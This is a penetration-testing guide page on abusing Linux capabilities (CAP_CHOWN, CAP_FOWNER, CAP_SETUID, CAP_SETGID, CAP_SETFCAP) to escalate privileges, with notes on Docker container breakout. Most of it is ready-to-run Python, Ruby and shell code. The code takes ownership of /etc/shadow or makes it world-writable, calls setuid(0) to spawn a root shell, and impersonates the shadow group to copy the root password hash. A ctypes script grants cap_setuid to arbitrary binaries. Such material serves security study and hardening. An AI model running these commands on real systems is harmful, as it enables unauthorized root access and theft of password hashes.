# Linux Capabilities - CAP CHOWN FOWNER SETGID SETFCAP

## CAP_CHOWN


**This means that it's possible to change the ownership of any file.**

**Example with binary**

Lets suppose the **`python`** binary has this capability, you can **change** the **owner** of the **shadow** file, **change root password**, and escalate privileges:

```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```

Or with the **`ruby`** binary having this capability:

```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```


## CAP_FOWNER


**This means that it's possible to change the permission of any file.**

**Example with binary**

If python has this capability you can modify the permissions of the shadow file, **change root password**, and escalate privileges:

```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```

### CAP_SETUID

**This means that it's possible to set the effective user id of the created process.**

**Example with binary**

If python has this **capability**, you can very easily abuse it to escalate privileges to root:

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

**Another way:**

```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```


## CAP_SETGID


**This means that it's possible to set the effective group id of the created process.**

There are a lot of files you can **overwrite to escalate privileges,** [**you can get ideas from here**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Example with binary**

In this case you should look for interesting files that a group can read because you can impersonate any group:

```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```

Once you have find a file you can abuse (via reading or writing) to escalate privileges you can **get a shell impersonating the interesting group** with:

```python
import os
os.setgid(42)
os.system("/bin/bash")
```

In this case the group shadow was impersonated so you can read the file `/etc/shadow`:

```bash
cat /etc/shadow
```

### Combined chain: CAP_SETGID + CAP_CHOWN

When both capabilities are available in the same helper, a practical chain is:

1. Switch EGID to `shadow` (or another privileged group).
2. Use `chown` on `/etc/shadow` to set your UID while keeping group `shadow`.
3. Read a target hash and crack/pivot.

```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```

This avoids needing full root directly and is commonly enough to pivot through credential reuse.

If **docker** is installed you could **impersonate** the **docker group** and abuse it to communicate with the [**docker socket** and escalate privileges](#writable-docker-socket).


## CAP_SETFCAP


**This means that it's possible to set capabilities on files and processes**

**Example with binary**

If python has this **capability**, you can very easily abuse it to escalate privileges to root:

```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
    print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```

> [!WARNING]
> Note that if you set a new capability to the binary with CAP_SETFCAP, you will lose this cap.

Once you have [SETUID capability](linux-capabilities.md#cap_setuid) you can go to its section to see how to escalate privileges.

**Example with environment (Docker breakout)**

By default the capability **CAP_SETFCAP is given to the proccess inside the container in Docker**. You can check that doing something like:

```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

This capability allow to **give any other capability to binaries**, so we could think about **escaping** from the container **abusing any of the other capability breakouts** mentioned in this page.\
However, if you try to give for example the capabilities CAP_SYS_ADMIN and CAP_SYS_PTRACE to the gdb binary, you will find that you can give them, but the **binary won’t be able to execute after this**:

```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```

[From the docs](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: This is a **limiting superset for the effective capabilities** that the thread may assume. It is also a limiting superset for the capabilities that may be added to the inheri‐table set by a thread that **does not have the CAP_SETPCAP** capability in its effective set._\
It looks like the Permitted capabilities limit the ones that can be used.\
However, Docker also grants the **CAP_SETPCAP** by default, so you might be able to **set new capabilities inside the inheritables ones**.\
However, in the documentation of this cap: _CAP_SETPCAP : \[…] **add any capability from the calling thread’s bounding** set to its inheritable set_.\
It looks like we can only add to the inheritable set capabilities from the bounding set. Which means that **we cannot put new capabilities like CAP_SYS_ADMIN or CAP_SYS_PTRACE in the inherit set to escalate privileges**.
